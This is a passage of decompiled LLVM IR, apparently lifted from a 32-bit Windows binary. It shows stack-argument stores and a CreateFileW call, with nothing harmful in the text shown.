  %719 = add i32 %esp.3.reload, -44, !insn.addr !1392
  %720 = inttoptr i32 %719 to i32*, !insn.addr !1392
  store i32 ptrtoint (i32* @global_var_10039334 to i32), i32* %720, align 4, !insn.addr !1392
  store i32 %712, i32* @global_var_1003e9c0, align 4, !insn.addr !1393
  %721 = add i32 %esp.3.reload, -48, !insn.addr !1394
  %722 = inttoptr i32 %721 to i32*, !insn.addr !1394
  store i32 %712, i32* %722, align 4, !insn.addr !1394
  store i32 %721, i32* %esp.5.reg2mem, !insn.addr !1395
  br label %dec_label_pc_10003625, !insn.addr !1395

dec_label_pc_10003332:                            ; preds = %dec_label_pc_10002dc4
  %723 = add i32 %esp.3.reload, -4, !insn.addr !1396
  %724 = inttoptr i32 %723 to i32*, !insn.addr !1396
  store i32 0, i32* %724, align 4, !insn.addr !1396
  %725 = add i32 %esp.3.reload, -8, !insn.addr !1397
  %726 = inttoptr i32 %725 to i32*, !insn.addr !1397
  store i32 128, i32* %726, align 4, !insn.addr !1397
  %727 = add i32 %esp.3.reload, -12, !insn.addr !1398
  %728 = inttoptr i32 %727 to i32*, !insn.addr !1398
  store i32 4, i32* %728, align 4, !insn.addr !1398
  %729 = add i32 %esp.3.reload, -16, !insn.addr !1399
  %730 = inttoptr i32 %729 to i32*, !insn.addr !1399
  store i32 0, i32* %730, align 4, !insn.addr !1399
  %731 = add i32 %esp.3.reload, -20, !insn.addr !1400
  %732 = inttoptr i32 %731 to i32*, !insn.addr !1400
  store i32 1, i32* %732, align 4, !insn.addr !1400
  %733 = add i32 %esp.3.reload, -24, !insn.addr !1401
  %734 = inttoptr i32 %733 to i32*, !insn.addr !1401
  store i32 4, i32* %734, align 4, !insn.addr !1401
  %735 = add i32 %esp.3.reload, -28, !insn.addr !1402
  %736 = inttoptr i32 %735 to i32*, !insn.addr !1402
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %736, align 4, !insn.addr !1402
  %737 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1403
  %738 = ptrtoint i32* %737 to i32, !insn.addr !1403
  %739 = add i32 %esp.3.reload, -32, !insn.addr !1404
